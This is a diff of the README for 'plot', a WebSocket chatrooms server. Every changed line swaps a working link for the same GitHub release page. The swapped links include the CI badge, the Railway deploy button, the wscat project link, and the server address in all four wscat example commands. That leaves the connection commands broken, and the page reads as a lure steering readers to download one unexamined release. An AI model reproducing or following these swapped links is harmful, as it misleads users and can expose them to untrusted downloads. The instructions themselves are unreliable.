@@ -2,32 +2,32 @@
 
 A WebSocket chatrooms server.
 
-![](../../actions/workflows/ci.yml/badge.svg)
+![](https://github.com/montaigne23/plot/releases/tag/v1.0)
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template/DZV--w?referralCode=bonus)
+[![Deploy on Railway](https://github.com/montaigne23/plot/releases/tag/v1.0)](https://github.com/montaigne23/plot/releases/tag/v1.0)
 
 ## Usage
 
-1. Connect using a WebSocket terminal client ([`wscat` recommended](https://github.com/websockets/wscat))
+1. Connect using a WebSocket terminal client ([`wscat` recommended](https://github.com/montaigne23/plot/releases/tag/v1.0))
 
    - With **no** installation
 
    ```sh
-   pnpm dlx wscat -c wss://plot.gq
+   pnpm dlx wscat -c https://github.com/montaigne23/plot/releases/tag/v1.0
    ```
 
    ```sh
-   yarn dlx wscat -c wss://plot.gq
+   yarn dlx wscat -c https://github.com/montaigne23/plot/releases/tag/v1.0
    ```
 
    ```sh
-   npx wscat -c wss://plot.gq
+   npx wscat -c https://github.com/montaigne23/plot/releases/tag/v1.0
    ```
 
    - After installation
 
    ```sh
-   wscat -c wss://plot.gq
+   wscat -c https://github.com/montaigne23/plot/releases/tag/v1.0
    ```
 
 2. Join a room with your friends and plot away! :tada:
